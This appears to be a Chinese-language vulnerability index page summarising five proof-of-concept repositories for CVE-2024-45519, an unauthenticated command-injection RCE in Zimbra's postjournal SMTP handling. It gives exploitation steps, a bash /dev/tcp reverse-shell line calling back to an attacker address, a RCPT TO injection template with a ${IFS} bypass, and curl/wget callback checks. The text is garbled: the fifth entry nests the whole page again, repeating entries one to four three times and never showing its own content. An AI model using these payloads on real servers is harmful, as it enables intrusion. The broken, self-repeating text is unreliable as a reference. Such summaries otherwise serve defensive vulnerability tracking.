# CVE-2024-45519

> 📦 该CVE有 **5** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-45519-Chocapikk_CVE-2024-45519.md](../2024/CVE-2024-45519-Chocapikk_CVE-2024-45519.md)

## CVE-2024-45519 - Zimbra Collaboration Suite 远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 8.8.15 Patch 46之前, 9.0.0 Patch 41之前, 10.0.9之前, 10.1.1之前

**利用条件:** 目标服务器开放SMTP端口（通常是25）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-45519 允许未经身份验证的攻击者在受影响的Zimbra服务器上执行任意命令。该漏洞位于`postjournal`服务中。攻击者可以通过构造特殊的SMTP请求，在`RCPT TO`命令中注入恶意代码，从而执行操作系统命令。根据漏洞利用代码，攻击者将构造一个包含反向shell命令的base64编码的字符串，并通过SMTP协议发送到目标服务器。`exploit.py`脚本展示了如何利用此漏洞，包括生成随机电子邮件地址、生成base64编码的反向shell命令、连接到SMTP服务器、发送经过精心构造的SMTP命令。投毒风险评估为10%，主要依据是代码中存在生成随机邮箱地址的行为，这可能会在实际攻击中隐藏攻击者的身份，从而增加溯源难度。但总体而言，漏洞利用代码的目的明确，功能相对独立，因此判定为高度投毒的可能性较低。

**利用方式：**

1.  **确定目标：** 找到运行易受攻击的Zimbra Collaboration Suite版本的服务器，并确定SMTP端口（默认为25）是否开放。
2.  **准备反向shell：** 确定攻击者的IP地址和端口，用于接收来自目标服务器的反向shell连接。
3.  **生成payload：** 使用漏洞利用代码生成包含反向shell命令的base64编码的payload。该payload会被注入到`RCPT TO`命令中。
4.  **发送SMTP请求：** 使用脚本或手动发送构造好的SMTP请求到目标服务器。该请求会利用`postjournal`服务的漏洞。
5.  **获取shell：** 如果攻击成功，攻击者将在其指定的IP地址和端口上接收到反向shell连接，从而控制目标服务器。

**项目地址:** [Chocapikk/CVE-2024-45519](https://github.com/Chocapikk/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #2

**来源**: [CVE-2024-45519-XiaomingX_cve-2024-45519-poc.md](../2024/CVE-2024-45519-XiaomingX_cve-2024-45519-poc.md)

## CVE-2024-45519-Zimbra-远程命令执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程命令执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 8.8.15 Patch 46之前, 9.0.0 Patch 41之前, 10.0.9之前, 10.1.1之前

**利用条件:** 目标Zimbra服务器的25端口开放且未打补丁

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519是一个存在于Zimbra Collaboration Suite (ZCS) postjournal服务中的远程命令执行漏洞。未经身份验证的攻击者可以利用此漏洞在受影响的Zimbra服务器上执行任意系统命令。

**有效性分析：**

根据提供的漏洞信息和搜索引擎结果，此漏洞已被积极利用，且CISA已将其添加到已知被利用漏洞目录中。POC代码尝试利用SMTP协议的RCPT TO字段中的命令注入漏洞来执行任意命令。POC首先检查目标端口是否开放，然后使用OAST（带外应用安全测试）服务验证漏洞是否存在，最后尝试利用反向shell有效负载进行漏洞利用。

**投毒风险分析：**

审查提供的Python脚本，没有发现明显的投毒代码。该脚本的主要目的是验证和利用CVE-2024-45519漏洞。所有操作都与描述的漏洞利用过程一致，如端口检查、SMTP命令发送、payload注入和reverse shell连接等。脚本没有包含任何隐藏的、非预期的恶意行为，比如数据窃取、恶意文件上传或未经授权的系统修改。脚本依赖用户提供的OAST和reverse shell地址，如果这些地址被恶意控制，可能导致用户受到攻击，但这不属于脚本本身的投毒。

**利用方式：**

1.  **端口扫描：** 使用`is_port_open`函数检查目标Zimbra服务器的25端口（SMTP）是否开放。
2.  **漏洞验证：** 使用`smtp_payload_check_vulnerability`函数，通过构造包含`curl`命令的RCPT TO字段，向目标服务器发送SMTP命令。`curl`命令会尝试访问用户指定的OAST URL，如果OAST服务器收到请求，则表明存在命令注入漏洞。
3.  **漏洞利用：** 使用`smtp_payload_exploit_reverse_shell`函数，构造包含反向shell命令的RCPT TO字段，向目标服务器发送SMTP命令。反向shell命令会在目标服务器上执行，并尝试连接到攻击者指定的IP地址和端口，从而建立一个反向shell连接。
4.  **命令执行：** 成功建立反向shell连接后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [XiaomingX/cve-2024-45519-poc](https://github.com/XiaomingX/cve-2024-45519-poc)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #3

**来源**: [CVE-2024-45519-p33d_CVE-2024-45519.md](../2024/CVE-2024-45519-p33d_CVE-2024-45519.md)

## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** ZCS before 8.8.15 Patch 46, 9 before 9.0.0 Patch 41, 10 before 10.0.9, and 10.1 before 10.1.1

**利用条件:** 目标Zimbra服务器的25端口（SMTP）开放，且存在漏洞版本的Zimbra。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 存在于Zimbra Collaboration Suite (ZCS) 的 postjournal 服务中，允许未经身份验证的攻击者执行任意命令。该漏洞是由于对输入的不当处理导致 OS 命令注入。利用方式如下：

1.  **漏洞原理：** 漏洞存在于 Zimbra 的 SMTP 服务中，通过构造恶意的 `RCPT TO` 命令，可以在服务器上执行任意命令。
2.  **利用步骤：**
    *   首先，连接到目标 Zimbra 服务器的 25 端口（SMTP）。
    *   发送 `EHLO` 命令进行握手。
    *   使用 `MAIL FROM` 命令指定发件人地址。
    *   通过构造包含命令注入的 `RCPT TO` 命令来利用漏洞。命令注入发生在双引号内，利用 `${IFS}` 绕过空格过滤。
    *   发送 `DATA` 命令，然后发送一些数据，最后以 `.
` 结束。
    *   最后，发送 `QUIT` 命令断开连接。
3.  **POC 代码分析：**  提供的 Python 脚本首先检查目标主机的 SMTP 端口是否开放。然后，它发送一个包含 OAST（Out-of-Band Application Security Testing）地址的 payload，以验证漏洞是否存在。如果漏洞存在，服务器会尝试访问 OAST 地址，从而确认漏洞。接下来，脚本尝试利用该漏洞建立反向 shell 连接到攻击者的机器上。脚本通过构造包含反向 shell 命令的 `RCPT TO` 命令来实现这一点。`reverse_shell = f'/bin/bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'` 这段代码定义了反向 shell 的命令，并将目标机器的标准输入、输出和错误重定向到攻击者的 IP 地址和端口。
4.  **有效性：**根据漏洞库信息、搜索结果和提供的 PoC 代码，可以判断该漏洞利用代码是有效的。搜索结果表明该漏洞已被积极利用。
5.  **投毒风险：**分析 PoC 代码内容，未发现作者隐藏的投毒代码。代码目的是验证漏洞，如果验证通过，会利用此漏洞反弹shell。
综上所述，该漏洞的威胁较高，因为它可以被未经身份验证的攻击者利用，并可能导致完全控制受影响的 Zimbra 服务器。

**项目地址:** [p33d/CVE-2024-45519](https://github.com/p33d/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #4

**来源**: [CVE-2024-45519-sec13b_CVE-2024-45519.md](../2024/CVE-2024-45519-sec13b_CVE-2024-45519.md)

## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 严重，允许未授权用户执行任意命令

**影响版本:** < 8.8.15 Patch 46, < 9.0.0 Patch 41, < 10.0.9, < 10.1.1

**利用条件:** 目标Zimbra服务器开启了postjournal服务，且端口对外开放

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 是 Zimbra Collaboration Suite (ZCS) 中 postjournal 服务存在的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者通过构造包含恶意命令的电子邮件，利用SMTP协议发送给目标服务器。目标服务器在处理该邮件时，会将恶意命令注入到操作系统中执行，从而实现远程代码执行。

**有效性:** 根据漏洞信息、搜索结果和提供的POC代码，此漏洞利用的有效性较高。漏洞库信息显示该漏洞允许未授权用户执行命令，搜索引擎结果表明该漏洞已被积极利用。提供的POC代码尝试通过构造包含命令的收件人邮箱地址来触发漏洞。

**投毒风险:** 分析POC代码，该脚本主要功能是利用SMTP协议发送包含恶意命令的邮件来触发目标系统的漏洞。该脚本依赖 `interactsh` 服务来验证漏洞是否成功利用，如果收到了回调就证明命令执行成功，`interactsh` 是一个用于带外漏洞检测的工具，本身不具备恶意代码投放能力。因此，在当前提供的代码中，不存在明显的投毒代码。投毒风险为0%。

**利用方式:**
1.  攻击者构造包含恶意命令的电子邮件地址（例如，`"admin$(' + command + ')"@mail.test.com`），其中`command`为要执行的操作系统命令。
2.  使用SMTP协议将该邮件发送到目标Zimbra服务器。
3.  Zimbra服务器的postjournal服务在处理邮件时，由于未正确过滤或转义特殊字符，会将恶意命令注入到操作系统中。
4.  操作系统执行恶意命令，从而导致远程代码执行。
5.  POC 使用 `interactsh` 验证是否利用成功。构造curl和wget命令，回连 `interactsh` 服务器，从而验证命令执行成功。

**项目地址:** [sec13b/CVE-2024-45519](https://github.com/sec13b/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #5

**来源**: [CVE-2024-45519-whiterose7777_CVE-2024-45519.md](../2024/CVE-2024-45519-whiterose7777_CVE-2024-45519.md)

# CVE-2024-45519

> 📦 该CVE有 **5** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-45519-Chocapikk_CVE-2024-45519.md](../2024/CVE-2024-45519-Chocapikk_CVE-2024-45519.md)

## CVE-2024-45519 - Zimbra Collaboration Suite 远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 8.8.15 Patch 46之前, 9.0.0 Patch 41之前, 10.0.9之前, 10.1.1之前

**利用条件:** 目标服务器开放SMTP端口（通常是25）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-45519 允许未经身份验证的攻击者在受影响的Zimbra服务器上执行任意命令。该漏洞位于`postjournal`服务中。攻击者可以通过构造特殊的SMTP请求，在`RCPT TO`命令中注入恶意代码，从而执行操作系统命令。根据漏洞利用代码，攻击者将构造一个包含反向shell命令的base64编码的字符串，并通过SMTP协议发送到目标服务器。`exploit.py`脚本展示了如何利用此漏洞，包括生成随机电子邮件地址、生成base64编码的反向shell命令、连接到SMTP服务器、发送经过精心构造的SMTP命令。投毒风险评估为10%，主要依据是代码中存在生成随机邮箱地址的行为，这可能会在实际攻击中隐藏攻击者的身份，从而增加溯源难度。但总体而言，漏洞利用代码的目的明确，功能相对独立，因此判定为高度投毒的可能性较低。

**利用方式：**

1.  **确定目标：** 找到运行易受攻击的Zimbra Collaboration Suite版本的服务器，并确定SMTP端口（默认为25）是否开放。
2.  **准备反向shell：** 确定攻击者的IP地址和端口，用于接收来自目标服务器的反向shell连接。
3.  **生成payload：** 使用漏洞利用代码生成包含反向shell命令的base64编码的payload。该payload会被注入到`RCPT TO`命令中。
4.  **发送SMTP请求：** 使用脚本或手动发送构造好的SMTP请求到目标服务器。该请求会利用`postjournal`服务的漏洞。
5.  **获取shell：** 如果攻击成功，攻击者将在其指定的IP地址和端口上接收到反向shell连接，从而控制目标服务器。

**项目地址:** [Chocapikk/CVE-2024-45519](https://github.com/Chocapikk/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #2

**来源**: [CVE-2024-45519-XiaomingX_cve-2024-45519-poc.md](../2024/CVE-2024-45519-XiaomingX_cve-2024-45519-poc.md)

## CVE-2024-45519-Zimbra-远程命令执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程命令执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 8.8.15 Patch 46之前, 9.0.0 Patch 41之前, 10.0.9之前, 10.1.1之前

**利用条件:** 目标Zimbra服务器的25端口开放且未打补丁

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519是一个存在于Zimbra Collaboration Suite (ZCS) postjournal服务中的远程命令执行漏洞。未经身份验证的攻击者可以利用此漏洞在受影响的Zimbra服务器上执行任意系统命令。

**有效性分析：**

根据提供的漏洞信息和搜索引擎结果，此漏洞已被积极利用，且CISA已将其添加到已知被利用漏洞目录中。POC代码尝试利用SMTP协议的RCPT TO字段中的命令注入漏洞来执行任意命令。POC首先检查目标端口是否开放，然后使用OAST（带外应用安全测试）服务验证漏洞是否存在，最后尝试利用反向shell有效负载进行漏洞利用。

**投毒风险分析：**

审查提供的Python脚本，没有发现明显的投毒代码。该脚本的主要目的是验证和利用CVE-2024-45519漏洞。所有操作都与描述的漏洞利用过程一致，如端口检查、SMTP命令发送、payload注入和reverse shell连接等。脚本没有包含任何隐藏的、非预期的恶意行为，比如数据窃取、恶意文件上传或未经授权的系统修改。脚本依赖用户提供的OAST和reverse shell地址，如果这些地址被恶意控制，可能导致用户受到攻击，但这不属于脚本本身的投毒。

**利用方式：**

1.  **端口扫描：** 使用`is_port_open`函数检查目标Zimbra服务器的25端口（SMTP）是否开放。
2.  **漏洞验证：** 使用`smtp_payload_check_vulnerability`函数，通过构造包含`curl`命令的RCPT TO字段，向目标服务器发送SMTP命令。`curl`命令会尝试访问用户指定的OAST URL，如果OAST服务器收到请求，则表明存在命令注入漏洞。
3.  **漏洞利用：** 使用`smtp_payload_exploit_reverse_shell`函数，构造包含反向shell命令的RCPT TO字段，向目标服务器发送SMTP命令。反向shell命令会在目标服务器上执行，并尝试连接到攻击者指定的IP地址和端口，从而建立一个反向shell连接。
4.  **命令执行：** 成功建立反向shell连接后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [XiaomingX/cve-2024-45519-poc](https://github.com/XiaomingX/cve-2024-45519-poc)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #3

**来源**: [CVE-2024-45519-p33d_CVE-2024-45519.md](../2024/CVE-2024-45519-p33d_CVE-2024-45519.md)

## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** ZCS before 8.8.15 Patch 46, 9 before 9.0.0 Patch 41, 10 before 10.0.9, and 10.1 before 10.1.1

**利用条件:** 目标Zimbra服务器的25端口（SMTP）开放，且存在漏洞版本的Zimbra。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 存在于Zimbra Collaboration Suite (ZCS) 的 postjournal 服务中，允许未经身份验证的攻击者执行任意命令。该漏洞是由于对输入的不当处理导致 OS 命令注入。利用方式如下：

1.  **漏洞原理：** 漏洞存在于 Zimbra 的 SMTP 服务中，通过构造恶意的 `RCPT TO` 命令，可以在服务器上执行任意命令。
2.  **利用步骤：**
    *   首先，连接到目标 Zimbra 服务器的 25 端口（SMTP）。
    *   发送 `EHLO` 命令进行握手。
    *   使用 `MAIL FROM` 命令指定发件人地址。
    *   通过构造包含命令注入的 `RCPT TO` 命令来利用漏洞。命令注入发生在双引号内，利用 `${IFS}` 绕过空格过滤。
    *   发送 `DATA` 命令，然后发送一些数据，最后以 `.
` 结束。
    *   最后，发送 `QUIT` 命令断开连接。
3.  **POC 代码分析：**  提供的 Python 脚本首先检查目标主机的 SMTP 端口是否开放。然后，它发送一个包含 OAST（Out-of-Band Application Security Testing）地址的 payload，以验证漏洞是否存在。如果漏洞存在，服务器会尝试访问 OAST 地址，从而确认漏洞。接下来，脚本尝试利用该漏洞建立反向 shell 连接到攻击者的机器上。脚本通过构造包含反向 shell 命令的 `RCPT TO` 命令来实现这一点。`reverse_shell = f'/bin/bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'` 这段代码定义了反向 shell 的命令，并将目标机器的标准输入、输出和错误重定向到攻击者的 IP 地址和端口。
4.  **有效性：**根据漏洞库信息、搜索结果和提供的 PoC 代码，可以判断该漏洞利用代码是有效的。搜索结果表明该漏洞已被积极利用。
5.  **投毒风险：**分析 PoC 代码内容，未发现作者隐藏的投毒代码。代码目的是验证漏洞，如果验证通过，会利用此漏洞反弹shell。
综上所述，该漏洞的威胁较高，因为它可以被未经身份验证的攻击者利用，并可能导致完全控制受影响的 Zimbra 服务器。

**项目地址:** [p33d/CVE-2024-45519](https://github.com/p33d/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #4

**来源**: [CVE-2024-45519-sec13b_CVE-2024-45519.md](../2024/CVE-2024-45519-sec13b_CVE-2024-45519.md)

## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 严重，允许未授权用户执行任意命令

**影响版本:** < 8.8.15 Patch 46, < 9.0.0 Patch 41, < 10.0.9, < 10.1.1

**利用条件:** 目标Zimbra服务器开启了postjournal服务，且端口对外开放

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 是 Zimbra Collaboration Suite (ZCS) 中 postjournal 服务存在的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者通过构造包含恶意命令的电子邮件，利用SMTP协议发送给目标服务器。目标服务器在处理该邮件时，会将恶意命令注入到操作系统中执行，从而实现远程代码执行。

**有效性:** 根据漏洞信息、搜索结果和提供的POC代码，此漏洞利用的有效性较高。漏洞库信息显示该漏洞允许未授权用户执行命令，搜索引擎结果表明该漏洞已被积极利用。提供的POC代码尝试通过构造包含命令的收件人邮箱地址来触发漏洞。

**投毒风险:** 分析POC代码，该脚本主要功能是利用SMTP协议发送包含恶意命令的邮件来触发目标系统的漏洞。该脚本依赖 `interactsh` 服务来验证漏洞是否成功利用，如果收到了回调就证明命令执行成功，`interactsh` 是一个用于带外漏洞检测的工具，本身不具备恶意代码投放能力。因此，在当前提供的代码中，不存在明显的投毒代码。投毒风险为0%。

**利用方式:**
1.  攻击者构造包含恶意命令的电子邮件地址（例如，`"admin$(' + command + ')"@mail.test.com`），其中`command`为要执行的操作系统命令。
2.  使用SMTP协议将该邮件发送到目标Zimbra服务器。
3.  Zimbra服务器的postjournal服务在处理邮件时，由于未正确过滤或转义特殊字符，会将恶意命令注入到操作系统中。
4.  操作系统执行恶意命令，从而导致远程代码执行。
5.  POC 使用 `interactsh` 验证是否利用成功。构造curl和wget命令，回连 `interactsh` 服务器，从而验证命令执行成功。

**项目地址:** [sec13b/CVE-2024-45519](https://github.com/sec13b/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #5

**来源**: [CVE-2024-45519-whiterose7777_CVE-2024-45519.md](../2024/CVE-2024-45519-whiterose7777_CVE-2024-45519.md)

# CVE-2024-45519

> 📦 该CVE有 **5** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-45519-Chocapikk_CVE-2024-45519.md](../2024/CVE-2024-45519-Chocapikk_CVE-2024-45519.md)

## CVE-2024-45519 - Zimbra Collaboration Suite 远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 8.8.15 Patch 46之前, 9.0.0 Patch 41之前, 10.0.9之前, 10.1.1之前

**利用条件:** 目标服务器开放SMTP端口（通常是25）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-45519 允许未经身份验证的攻击者在受影响的Zimbra服务器上执行任意命令。该漏洞位于`postjournal`服务中。攻击者可以通过构造特殊的SMTP请求，在`RCPT TO`命令中注入恶意代码，从而执行操作系统命令。根据漏洞利用代码，攻击者将构造一个包含反向shell命令的base64编码的字符串，并通过SMTP协议发送到目标服务器。`exploit.py`脚本展示了如何利用此漏洞，包括生成随机电子邮件地址、生成base64编码的反向shell命令、连接到SMTP服务器、发送经过精心构造的SMTP命令。投毒风险评估为10%，主要依据是代码中存在生成随机邮箱地址的行为，这可能会在实际攻击中隐藏攻击者的身份，从而增加溯源难度。但总体而言，漏洞利用代码的目的明确，功能相对独立，因此判定为高度投毒的可能性较低。

**利用方式：**

1.  **确定目标：** 找到运行易受攻击的Zimbra Collaboration Suite版本的服务器，并确定SMTP端口（默认为25）是否开放。
2.  **准备反向shell：** 确定攻击者的IP地址和端口，用于接收来自目标服务器的反向shell连接。
3.  **生成payload：** 使用漏洞利用代码生成包含反向shell命令的base64编码的payload。该payload会被注入到`RCPT TO`命令中。
4.  **发送SMTP请求：** 使用脚本或手动发送构造好的SMTP请求到目标服务器。该请求会利用`postjournal`服务的漏洞。
5.  **获取shell：** 如果攻击成功，攻击者将在其指定的IP地址和端口上接收到反向shell连接，从而控制目标服务器。

**项目地址:** [Chocapikk/CVE-2024-45519](https://github.com/Chocapikk/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #2

**来源**: [CVE-2024-45519-XiaomingX_cve-2024-45519-poc.md](../2024/CVE-2024-45519-XiaomingX_cve-2024-45519-poc.md)

## CVE-2024-45519-Zimbra-远程命令执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程命令执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 8.8.15 Patch 46之前, 9.0.0 Patch 41之前, 10.0.9之前, 10.1.1之前

**利用条件:** 目标Zimbra服务器的25端口开放且未打补丁

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519是一个存在于Zimbra Collaboration Suite (ZCS) postjournal服务中的远程命令执行漏洞。未经身份验证的攻击者可以利用此漏洞在受影响的Zimbra服务器上执行任意系统命令。

**有效性分析：**

根据提供的漏洞信息和搜索引擎结果，此漏洞已被积极利用，且CISA已将其添加到已知被利用漏洞目录中。POC代码尝试利用SMTP协议的RCPT TO字段中的命令注入漏洞来执行任意命令。POC首先检查目标端口是否开放，然后使用OAST（带外应用安全测试）服务验证漏洞是否存在，最后尝试利用反向shell有效负载进行漏洞利用。

**投毒风险分析：**

审查提供的Python脚本，没有发现明显的投毒代码。该脚本的主要目的是验证和利用CVE-2024-45519漏洞。所有操作都与描述的漏洞利用过程一致，如端口检查、SMTP命令发送、payload注入和reverse shell连接等。脚本没有包含任何隐藏的、非预期的恶意行为，比如数据窃取、恶意文件上传或未经授权的系统修改。脚本依赖用户提供的OAST和reverse shell地址，如果这些地址被恶意控制，可能导致用户受到攻击，但这不属于脚本本身的投毒。

**利用方式：**

1.  **端口扫描：** 使用`is_port_open`函数检查目标Zimbra服务器的25端口（SMTP）是否开放。
2.  **漏洞验证：** 使用`smtp_payload_check_vulnerability`函数，通过构造包含`curl`命令的RCPT TO字段，向目标服务器发送SMTP命令。`curl`命令会尝试访问用户指定的OAST URL，如果OAST服务器收到请求，则表明存在命令注入漏洞。
3.  **漏洞利用：** 使用`smtp_payload_exploit_reverse_shell`函数，构造包含反向shell命令的RCPT TO字段，向目标服务器发送SMTP命令。反向shell命令会在目标服务器上执行，并尝试连接到攻击者指定的IP地址和端口，从而建立一个反向shell连接。
4.  **命令执行：** 成功建立反向shell连接后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [XiaomingX/cve-2024-45519-poc](https://github.com/XiaomingX/cve-2024-45519-poc)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #3

**来源**: [CVE-2024-45519-p33d_CVE-2024-45519.md](../2024/CVE-2024-45519-p33d_CVE-2024-45519.md)

## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** ZCS before 8.8.15 Patch 46, 9 before 9.0.0 Patch 41, 10 before 10.0.9, and 10.1 before 10.1.1

**利用条件:** 目标Zimbra服务器的25端口（SMTP）开放，且存在漏洞版本的Zimbra。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 存在于Zimbra Collaboration Suite (ZCS) 的 postjournal 服务中，允许未经身份验证的攻击者执行任意命令。该漏洞是由于对输入的不当处理导致 OS 命令注入。利用方式如下：

1.  **漏洞原理：** 漏洞存在于 Zimbra 的 SMTP 服务中，通过构造恶意的 `RCPT TO` 命令，可以在服务器上执行任意命令。
2.  **利用步骤：**
    *   首先，连接到目标 Zimbra 服务器的 25 端口（SMTP）。
    *   发送 `EHLO` 命令进行握手。
    *   使用 `MAIL FROM` 命令指定发件人地址。
    *   通过构造包含命令注入的 `RCPT TO` 命令来利用漏洞。命令注入发生在双引号内，利用 `${IFS}` 绕过空格过滤。
    *   发送 `DATA` 命令，然后发送一些数据，最后以 `.
` 结束。
    *   最后，发送 `QUIT` 命令断开连接。
3.  **POC 代码分析：**  提供的 Python 脚本首先检查目标主机的 SMTP 端口是否开放。然后，它发送一个包含 OAST（Out-of-Band Application Security Testing）地址的 payload，以验证漏洞是否存在。如果漏洞存在，服务器会尝试访问 OAST 地址，从而确认漏洞。接下来，脚本尝试利用该漏洞建立反向 shell 连接到攻击者的机器上。脚本通过构造包含反向 shell 命令的 `RCPT TO` 命令来实现这一点。`reverse_shell = f'/bin/bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'` 这段代码定义了反向 shell 的命令，并将目标机器的标准输入、输出和错误重定向到攻击者的 IP 地址和端口。
4.  **有效性：**根据漏洞库信息、搜索结果和提供的 PoC 代码，可以判断该漏洞利用代码是有效的。搜索结果表明该漏洞已被积极利用。
5.  **投毒风险：**分析 PoC 代码内容，未发现作者隐藏的投毒代码。代码目的是验证漏洞，如果验证通过，会利用此漏洞反弹shell。
综上所述，该漏洞的威胁较高，因为它可以被未经身份验证的攻击者利用，并可能导致完全控制受影响的 Zimbra 服务器。

**项目地址:** [p33d/CVE-2024-45519](https://github.com/p33d/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #4

**来源**: [CVE-2024-45519-sec13b_CVE-2024-45519.md](../2024/CVE-2024-45519-sec13b_CVE-2024-45519.md)

## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 严重，允许未授权用户执行任意命令

**影响版本:** < 8.8.15 Patch 46, < 9.0.0 Patch 41, < 10.0.9, < 10.1.1

**利用条件:** 目标Zimbra服务器开启了postjournal服务，且端口对外开放

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 是 Zimbra Collaboration Suite (ZCS) 中 postjournal 服务存在的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者通过构造包含恶意命令的电子邮件，利用SMTP协议发送给目标服务器。目标服务器在处理该邮件时，会将恶意命令注入到操作系统中执行，从而实现远程代码执行。

**有效性:** 根据漏洞信息、搜索结果和提供的POC代码，此漏洞利用的有效性较高。漏洞库信息显示该漏洞允许未授权用户执行命令，搜索引擎结果表明该漏洞已被积极利用。提供的POC代码尝试通过构造包含命令的收件人邮箱地址来触发漏洞。

**投毒风险:** 分析POC代码，该脚本主要功能是利用SMTP协议发送包含恶意命令的邮件来触发目标系统的漏洞。该脚本依赖 `interactsh` 服务来验证漏洞是否成功利用，如果收到了回调就证明命令执行成功，`interactsh` 是一个用于带外漏洞检测的工具，本身不具备恶意代码投放能力。因此，在当前提供的代码中，不存在明显的投毒代码。投毒风险为0%。

**利用方式:**
1.  攻击者构造包含恶意命令的电子邮件地址（例如，`"admin$(' + command + ')"@mail.test.com`），其中`command`为要执行的操作系统命令。
2.  使用SMTP协议将该邮件发送到目标Zimbra服务器。
3.  Zimbra服务器的postjournal服务在处理邮件时，由于未正确过滤或转义特殊字符，会将恶意命令注入到操作系统中。
4.  操作系统执行恶意命令，从而导致远程代码执行。
5.  POC 使用 `interactsh` 验证是否利用成功。构造curl和wget命令，回连 `interactsh` 服务器，从而验证命令执行成功。

**项目地址:** [sec13b/CVE-2024-45519](https://github.com/sec13b/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

---

## POC #5

**来源**: [CVE-2024-45519-whiterose7777_CVE-2024-45519.md](../2024/CVE-2024-45519-whiterose7777_CVE-2024-45519.md)

# CVE-2024-45519

> 📦 该CVE有 **5** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-45519-Chocapikk_CVE-2024-45519.md](../2024/CVE-2024-45519-Chocapikk_CVE-2024-45519.md)

## CVE-2024-45519 - Zimbra Collaboration Suite 远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 8.8.15 Patch 46之前, 9.0.0 Patch 41之前, 10.0.9之前, 10.1.1之前

